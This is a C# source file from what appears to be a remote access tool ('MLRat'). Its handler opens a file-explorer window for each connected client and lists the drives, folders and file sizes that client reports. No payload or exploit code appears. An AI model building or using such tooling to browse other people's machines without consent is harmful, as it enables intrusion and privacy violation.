using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class FileExplorerHandler
    {
        static Dictionary<Guid, FileExplorerForm> FormHandler = new Dictionary<Guid, FileExplorerForm>();
        static IServerUIHandler UIHost = null;
        public static void SetUIHost(IServerUIHandler handler)
        {
            UIHost = handler;
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach(IClient c in clients)
            {
                Start(c);
            }
        }

        public static void Disconnect(IClient c)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void Handle(IClient c, object[] data)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FileManagerCommand command = (FileManagerCommand)data[1];
                Console.WriteLine("File Manager: {0}", command.ToString());
                if (command == FileManagerCommand.DriveResponce)
                {
                    FormHandler[c.ID].BeginUpdate(false);
                    string[] drives = (string[])data[2];
                    string[] driveSizes = (string[])data[3];
                    string[] driveLabels = (string[])data[4];

                    for(int i = 0; i < drives.Length; i++)
                    {
                        FormHandler[c.ID].AddDrive(drives[i], driveSizes[i], driveLabels[i]);
                    }
                        
                }
                if (command == FileManagerCommand.DirectoryResponce)
                {
                    FormHandler[c.ID].BeginUpdate(true);
                    string[] folders = (string[])data[2];
                    string[] files = (string[])data[3];
                    string[] filesizes = (string[])data[4];
                    foreach(string s in folders)
                        FormHandler[c.ID].AddToList(s, "", "Folder");
                    for (int i = 0; i < files.Length; i++)
                    {
                        FormHandler[c.ID].AddToList(files[i], filesizes[i], "File");
                    }
                        
                }
                if(command == FileManagerCommand.Invalid)
                {
                    FormHandler[c.ID].BeginUpdate(true);
                    FormHandler[c.ID].InvalidDirectory((string)data[2]);
                }
            }
        }

        public static void Start(IClient c)
        {
            if (!FormHandler.ContainsKey(c.ID))
            {
                FileExplorerForm form = new FileExplorerForm(UIHost, c);
                form.Text = string.Format("File Explorer ({0})", c.GetVariable<string>("Username", ""));
                form.FormClosed += Form_FormClosed; ;
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            FileExplorerForm form = (FileExplorerForm)sender;
            if (FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }
    }
}
